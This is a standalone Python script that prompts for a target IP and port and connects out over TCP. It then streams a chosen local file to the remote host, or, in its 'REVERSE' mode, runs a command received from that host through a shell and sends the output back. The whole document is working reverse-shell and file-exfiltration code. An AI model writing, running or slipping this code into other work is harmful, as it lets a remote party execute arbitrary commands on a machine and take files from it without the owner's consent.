import time, socket, sys, os, subprocess
 

def get_info_mine(): # GET IP - global [Get_My_IP]
    global Get_My_IP
    Get_My_Host = socket.gethostname()
    Get_My_IP = socket.gethostbyname(Get_My_Host)
       
    
def transmitted_file():
    try:
        print("\n")
        get_info_mine()
        print('YOUR IP ADDRESS: ',Get_My_IP)
        socket_server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print("\n")
        server_host = str(input('TYPE YOUR TARGET IP: ')).replace(" ","")
        # server_host = "0.0.0.0"
        server_port = int(input("TYPE YOUR TARGET PORT: "))
        choice_user = str(input("TYPE YOUR FORMAT TO SEND OR START REVERSE [TXT/PDF/REVERSE]: ")).upper().replace(" ","")
        print("\n")
        time.sleep(1.2)
        socket_server.connect((server_host, server_port))
        socket_server.send(choice_user.encode())
        recv_f_size = 1024
        
        if choice_user == "TXT":
            file_dir = str(input("TYPE YOUR FILE DIRECTORY TO SEND: ")).replace(" ","")
            print("\n")
            time.sleep(1.2)
            with open(file_dir,"r") as f_get:
                while True:
                    bt_read = f_get.read(recv_f_size)
                    if not bt_read:
                        time.sleep(0.8)
                        break
                    socket_server.sendall(bt_read.encode())
                    print("PROCESS HAS BEEN DONE SUCCESSFULLY")
                    print("\n")
            socket_server.close()
        elif choice_user == "PDF":
            file_dir = str(input("TYPE YOUR FILE URL TO SEND: ")).replace(" ","")
            print("\n")
            socket_server.send(file_dir.encode())
            print("PROCESS HAS BEEN DONE SUCCESSFULLY")
            print("\n")
            socket_server.close()
            time.sleep(0.8)
            pass
        elif choice_user == "REVERSE":
            command_recv = socket_server.recv(1024).decode()
            command_run = subprocess.Popen(command_recv,shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            socket_server.send(command_run.stdout.read())
            socket_server.close()
            print("COMMAND PROCESS COMPLETED SUCCESSFULLY AND SENT TO THE MACHINE")
            print("\n")
            time.sleep(0.8)
            pass
        else:
            socket_server.close()
            time.sleep(0.8)
            pass
    except:
        print("SOMETHING IS WRONG, PLEASE CHECK YOUR INTERNET CONNECTION AND PARAMETERS")
        print("\n")
        time.sleep(0.8)
        pass

if __name__ == "__main__":
    transmitted_file()    
